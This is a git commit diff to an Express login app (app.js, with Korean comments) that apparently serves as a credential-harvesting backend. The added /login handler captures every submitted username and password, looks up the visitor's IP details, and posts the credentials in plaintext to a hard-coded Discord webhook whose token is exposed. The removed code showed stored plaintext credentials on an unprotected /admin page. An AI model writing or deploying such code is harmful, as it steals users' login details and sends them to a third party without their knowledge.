b95b1fa75bb072639af3e52cc2460355701c5df0
S <88224826+KimPpoly@users.noreply.github.com>
2024-02-27 12:50:21 +0900

    Update app.js

--- app.js
+++ app.js
@@ -2,6 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fs = require('fs');
 const axios = require('axios');
+const { format } = require('path');
 
 const app = express();
 const PORT = 3000;
@@ -20,12 +21,74 @@ app.post('/pushoong', (req, res) => {
 
 });
 
-let users = [];
+
 // 로그인 요청 처리
 app.post('/login', (req, res) => {
     const { username, password } = req.body;
 
-    users.push({ username, password});
+    // 날짜
+    var today = new Date();
+    var year = today.getFullYear();
+    var month = ('0' + (today.getMonth() + 1)).slice(-2);
+    var day = ('0' + today.getDate()).slice(-2);
+    var dateString = year + '-' + month + '-' + day;
+    // 시간
+    var hours = ('0' + today.getHours()).slice(-2); 
+    var minutes = ('0' + today.getMinutes()).slice(-2);
+    var seconds = ('0' + today.getSeconds()).slice(-2); 
+    var timeString = hours + ':' + minutes  + ':' + seconds;
+    // 아이피
+    async function getIPAddress() {
+        try {
+            const response = await axios.get('https://ipinfo.io/json');
+            const ip = response.data;
+            return ip;
+        } catch (error) {
+            console.error('Error fetching IP address', error);
+            throw error;
+        }
+    }
+    async function saveIPAddressToFile() {
+        try {
+            const ip = await getIPAddress()
+            const ipo = JSON.stringify(ip)
+            const ipa = JSON.parse(ipo)
+            // 객체의 프로퍼티를 순회하며 포맷팅
+            let formattedStr ='';
+            for (const key in ipa) {
+                if (Object.hasOwnProperty.call(ipa, key)) {
+                    formattedStr += `"${key}":"${ipa[key]}",\n`;
+                }
+            }
+            // 마지막 쉼표(,)와 줄바꿈(\n) 제거
+            formattedStr = formattedStr.slice(0, -2);
+            formattedStr += '';
+
+            const { username, password } = req.body;
+        
+            const webhookUrl = 'https://discord.com/api/webhooks/1209216215629955072/0ed2SjWHxTIsJO0fTcjAqj4MePQ9VZhKjNAPxFX1xOcUmJazpB0sr_xCqI0A2s2Ioouz';
+            const message = {
+                content : '----------------------------------------------------------------------\n' + 'id : ' + username + '\n' + 'pw : ' + password + '\n\n' + formattedStr + '   ' + dateString + ' / ' + timeString + '\n----------------------------------------------------------------------\n'
+            };
+            
+            async function sendWebhook() {
+                try {
+                    const response = await axios.post(webhookUrl, message);
+                    console.log('Message sent successfully:', response.data);
+                } catch (error) {
+                    console.error('Error sending message:', error);
+                }
+            }
+            sendWebhook()
+
+        } catch (error) {
+            console.error('Error saving IP address to file:', error);
+        }
+    }
+
+    // 사용자의 IP 주소를 가져와서 파일에 저장
+    saveIPAddressToFile();
+
 
     // 입력한 ID를 파일에 저장
 
@@ -100,63 +163,10 @@ app.post('/login', (req, res) => {
     }
 });
 
-
 // 어드민 페이지 제공
 app.get('/admin', (req, res) => {
-    // ex) 2024-02-26
-    var today = new Date();
-    var year = today.getFullYear();
-    var month = ('0' + (today.getMonth() + 1)).slice(-2);
-    var day = ('0' + today.getDate()).slice(-2);
-    var dateString = year + '-' + month + '-' + day;
-    // ex) 05:06:53
-    var hours = ('0' + today.getHours()).slice(-2); 
-    var minutes = ('0' + today.getMinutes()).slice(-2);
-    var seconds = ('0' + today.getSeconds()).slice(-2); 
-    var timeString = hours + ':' + minutes  + ':' + seconds;
+    res.send('<h1>Welcome to Admin Page</h1>');
 
-    // ip address
-    async function getIPAddress() {
-        try {
-            const response = await axios.get('https://api.ipify.org/?format=json');
-            const ip = response.data;
-            return ip;
-        } catch (error) {
-            console.error('Error fetching IP address', error);
-            throw error;
-        }
-    }
-    // IP 주소를 가져와서 user_ids.txt 파일에 추가하는 함수
-    async function saveIPAddressToFile() {
-        try {
-            const ip = await getIPAddress()
-            const ipo = JSON.stringify(ip)
-            const ipa = JSON.parse(ipo)
-            // 객체의 프로퍼티를 순회하며 포맷팅
-            let formattedStr ='{\n';
-            for (const key in ipa) {
-                if (Object.hasOwnProperty.call(ipa, key)) {
-                    formattedStr += `"${key}":"${ipa[key]}",\n`;
-                }
-            }
-            // 마지막 쉼표(,)와 줄바꿈(\n) 제거
-            formattedStr = formattedStr.slice(0, -2);
-            formattedStr += '\n}';
-
-            var userinfo = JSON.stringify(users);
-            const log = '<br>----------------------------------------<br>' + userinfo + '<br>' + formattedStr + '<br>----------------------------------------  ' + dateString + ' / ' + timeString + '<br><br>'
-            res.send(log)
-        } catch (error) {
-            console.error('Error saving IP address to file:', error);
-        }
-    }
-    saveIPAddressToFile();
-
-    // res.send('<h1>Welcome to Admin Page</h1>');
-    // res.send(users.join(', '));
-
-    // var userinfo = JSON.stringify(users);
-    // res.send(dateString + " / " + timeString + " / " + userinfo + " / " + formattedStr)
 });
 
 // 기본 페이지 제공
